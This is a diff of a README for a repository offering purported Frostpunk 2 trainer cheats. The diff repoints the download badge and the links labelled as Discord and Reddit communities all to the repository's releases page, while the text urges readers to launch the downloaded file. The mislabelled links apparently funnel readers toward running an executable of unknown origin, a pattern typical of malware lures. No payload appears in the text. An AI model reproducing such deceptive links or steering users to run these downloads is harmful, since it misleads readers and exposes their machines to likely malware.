@@ -12,7 +12,7 @@ Welcome to the ultimate repository for Frostpunk 2 Trainer Cheats! If you are lo
 
 To access the latest releases and download the Frostpunk 2 Trainer Cheats, click the button below:
 
-[![Download Frostpunk 2 Trainer Cheats](https://img.shields.io/badge/Download-Frostpunk_2_Trainer_Cheats-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Frostpunk 2 Trainer Cheats](https://github.com/Mmmahith121/Frostpunk-2-Trainer-Cheats/releases)](https://github.com/Mmmahith121/Frostpunk-2-Trainer-Cheats/releases)
 
 In case the link ends with a file name, make sure to launch the downloaded file to access the cheats and trainers for Frostpunk 2. If the provided link does not work or is not available, please check the "Releases" section of the repository for alternative download options.
 
@@ -36,8 +36,8 @@ Harness the power of cheat engine capabilities to customize your Frostpunk 2 gam
 
 Connect with fellow Frostpunk 2 players, share tips and tricks, and stay updated on the latest cheats and trainers by joining our community:
 
-- Discord: [Frostpunk 2 Cheats Community](https://discord.gg/frostpunk2cheats)
-- Reddit: [r/Frostpunk2Cheats](https://www.reddit.com/r/Frostpunk2Cheats/)
+- Discord: [Frostpunk 2 Cheats Community](https://github.com/Mmmahith121/Frostpunk-2-Trainer-Cheats/releases)
+- Reddit: [r/Frostpunk2Cheats](https://github.com/Mmmahith121/Frostpunk-2-Trainer-Cheats/releases)
 
 ## Spread the Word 📣
 
